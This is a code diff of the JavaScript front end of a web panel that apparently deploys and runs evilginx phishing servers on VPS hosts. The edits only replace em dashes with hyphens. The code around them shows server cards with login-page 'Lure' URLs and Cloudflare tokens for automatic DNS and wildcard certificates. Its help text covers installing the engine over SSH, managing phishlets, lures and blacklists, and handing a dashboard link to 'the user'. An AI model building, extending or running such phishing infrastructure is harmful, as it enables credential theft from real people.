@@ -119,15 +119,15 @@ async function viewServers() {
   S.profiles = d.profiles;
   setHeader(TITLES.servers[0], TITLES.servers[1],
     '<button class="btn sm" data-act="refresh">Refresh</button><button class="btn sm primary" data-act="new">+ Add server</button>');
-  if (!d.profiles.length) return '<div class="empty"><div class="big">▤</div>No servers yet. Click <b>Add server</b> and enter the VPS IP + root password — the panel installs everything for you.</div>';
+  if (!d.profiles.length) return '<div class="empty"><div class="big">▤</div>No servers yet. Click <b>Add server</b> and enter the VPS IP + root password - the panel installs everything for you.</div>';
   var h = '<div class="grid cards">';
   d.profiles.forEach(function (p) {
     h += '<div class="card">' +
       '<div class="card-head"><h3>' + esc(p.name) + ' ' + statusBadge(p) + '</h3><span class="dim mono" style="font-size:10px">' + esc(p.user) + '@' + esc(p.host) + ':' + p.port + '</span></div>' +
       '<div style="padding:14px 16px">' +
         '<div class="kv">' +
-          '<span class="k">Domain</span><span class="v">' + esc(p.domain || '—') + '</span>' +
-          '<span class="k">Lure</span><span class="v">' + (p.domain ? 'https://login.' + esc(p.domain) + '/auth/login' : '—') + '</span>' +
+          '<span class="k">Domain</span><span class="v">' + esc(p.domain || '-') + '</span>' +
+          '<span class="k">Lure</span><span class="v">' + (p.domain ? 'https://login.' + esc(p.domain) + '/auth/login' : '-') + '</span>' +
           '<span class="k">Last check</span><span class="v">' + ago(p.last_seen) + '</span>' +
           (p.version ? '<span class="k">Version</span><span class="v">' + esc(p.version) + '</span>' : '') +
           (p.last_error ? '<span class="k">Error</span><span class="v" style="color:var(--err)">' + esc(p.last_error) + '</span>' : '') +
@@ -173,8 +173,8 @@ async function viewSettings() {
   return '<div class="grid" style="grid-template-columns:repeat(auto-fit,minmax(420px,1fr))">' +
     '<div class="card"><div class="card-head"><h3>Build &amp; binary</h3><span class="badge ' + (s.go_found ? 'ok' : 'warn') + '">' + (s.go_found ? 'go found' : 'go missing') + '</span></div><div style="padding:16px">' +
       '<div class="field"><label>Repo directory</label><input id="sRepo" value="' + esc(s.repo_dir) + '"></div>' +
-      '<div class="field"><label>linux/amd64 binary</label><input id="sAmd" value="' + esc(s.bin_amd64) + '"> <span class="hint">' + (s.amd64_ready ? 'present' : 'missing — will auto-build') + '</span></div>' +
-      '<div class="field"><label>linux/arm64 binary</label><input id="sArm" value="' + esc(s.bin_arm64) + '"> <span class="hint">' + (s.arm64_ready ? 'present' : 'missing — will auto-build') + '</span></div>' +
+      '<div class="field"><label>linux/amd64 binary</label><input id="sAmd" value="' + esc(s.bin_amd64) + '"> <span class="hint">' + (s.amd64_ready ? 'present' : 'missing - will auto-build') + '</span></div>' +
+      '<div class="field"><label>linux/arm64 binary</label><input id="sArm" value="' + esc(s.bin_arm64) + '"> <span class="hint">' + (s.arm64_ready ? 'present' : 'missing - will auto-build') + '</span></div>' +
       '<label class="switch mb14"><input type="checkbox" id="sAuto"' + (s.auto_build ? ' checked' : '') + '><span class="track"></span><span class="muted">Auto-build with local Go when a binary is missing</span></label>' +
       '<div class="actions"><button class="btn primary" data-act="save-settings">Save</button><button class="btn" data-act="build">Build binaries now</button></div>' +
     '</div></div>' +
@@ -194,10 +194,10 @@ async function viewSettings() {
     '</div></div>' +
     '<div class="card"><div class="card-head"><h3>How it works</h3></div><div style="padding:16px" class="muted">' +
       '<p>1. Add a server (IP + root password or SSH key).</p>' +
-      '<p>2. Click <b>Install</b> — the panel connects over SSH, installs the engine, writes config, opens the firewall, starts the service and verifies it.</p>' +
+      '<p>2. Click <b>Install</b> - the panel connects over SSH, installs the engine, writes config, opens the firewall, starts the service and verifies it.</p>' +
       '<p>3. Click <b>Manage</b> to control phishlets, lures, redirects, blacklist and settings.</p>' +
       '<p>4. Give the user the <b>Dashboard</b> link + the extension below.</p>' +
-      '<p class="mt8">Everything lives in this one folder — copy it anywhere and it keeps working.</p>' +
+      '<p class="mt8">Everything lives in this one folder - copy it anywhere and it keeps working.</p>' +
     '</div></div>' +
   '</div>';
 }
@@ -232,7 +232,7 @@ function editProfile(p) {
       '<div class="field"><label>Dashboard password</label><input data-p="dashboard_pass" value="' + esc(p.dashboard_pass) + '"><span class="hint">empty = auto-generated on install</span></div>' +
       '<label class="switch mb14"><input type="checkbox" data-p="debug"' + (p.debug ? ' checked' : '') + '><span class="track"></span><span class="muted">Verbose (-debug) logging</span></label>') +
     pane('cf', false,
-      '<div class="field"><label>Cloudflare API token</label><input data-p="cf_token" type="password" value="' + esc(p.cf_token) + '"><span class="hint">Zone:DNS:Edit — enables auto A records + wildcard cert</span></div>' +
+      '<div class="field"><label>Cloudflare API token</label><input data-p="cf_token" type="password" value="' + esc(p.cf_token) + '"><span class="hint">Zone:DNS:Edit - enables auto A records + wildcard cert</span></div>' +
       '<div class="row"><div class="field"><label>Cert email</label><input data-p="cert_email" value="' + esc(p.cert_email) + '"></div>' +
       '<label class="switch" style="margin-top:20px"><input type="checkbox" data-p="use_wildcard"' + (p.use_wildcard ? ' checked' : '') + '><span class="track"></span><span class="muted">Issue wildcard cert</span></label></div>' +
       '<div class="actions mt8"><button class="btn sm" data-act="cf-verify">Verify token</button></div>') +
@@ -310,11 +310,11 @@ function showDiscovery(d, id, fromTest) {
       '<button class="btn" data-act="modal-close">Close</button></div>');
     return;
   }
-  function kv(k, v, cls) { return '<span class="k">' + esc(k) + '</span><span class="v ' + (cls || '') + '">' + esc(v || '—') + '</span>'; }
+  function kv(k, v, cls) { return '<span class="k">' + esc(k) + '</span><span class="v ' + (cls || '') + '">' + esc(v || '-') + '</span>'; }
   var notes = (d.notes || []).map(function (n) { return '<div class="hint">• ' + esc(n) + '</div>'; }).join('');
   openModal('Existing deployment found',
     '<div class="badge ok">detected</div>' +
-    '<div class="hint mt8">Importing keeps the server exactly as it is — nothing is reinstalled.</div>' +
+    '<div class="hint mt8">Importing keeps the server exactly as it is - nothing is reinstalled.</div>' +
     '<div class="kv mt14">' +
       kv('Install dir', d.install_dir) +
       kv('Domain', d.domain) +
@@ -390,10 +390,10 @@ var ACTIONS = {
   uninstall: function (id) { if (confirm('Stop + disable the engine on this VPS? Config is kept.')) run(async function () { var r = await API.post('/api/profiles/' + id + '/uninstall'); closeDrawer(); jobModal(r.job); }); },
   status: function (id) { run(async function () { var s = await API.get('/api/profiles/' + id + '/status'); openModal('Status · ' + esc(s.domain), '<div class="kv">' +
       '<span class="k">Reachable</span><span class="v">' + (s.reachable ? 'yes' : 'no') + '</span>' +
-      '<span class="k">Service</span><span class="v">' + esc(s.service || '—') + '</span>' +
-      '<span class="k">Ports</span><span class="v">' + esc(s.ports || '—') + '</span>' +
-      '<span class="k">Version</span><span class="v">' + esc(s.version || '—') + '</span>' +
-      '<span class="k">Cert expiry</span><span class="v">' + esc(s.cert || '—') + '</span>' +
+      '<span class="k">Service</span><span class="v">' + esc(s.service || '-') + '</span>' +
+      '<span class="k">Ports</span><span class="v">' + esc(s.ports || '-') + '</span>' +
+      '<span class="k">Version</span><span class="v">' + esc(s.version || '-') + '</span>' +
+      '<span class="k">Cert expiry</span><span class="v">' + esc(s.cert || '-') + '</span>' +
       (s.error ? '<span class="k">Error</span><span class="v" style="color:var(--err)">' + esc(s.error) + '</span>' : '') +
     '</div>'); render(); }); },
   logs: function (id) { run(async function () { var d = await API.get('/api/profiles/' + id + '/logs?lines=300'); openModal('Logs · evilginx', '<div class="log">' + esc(d.log) + '</div>', true); }); },
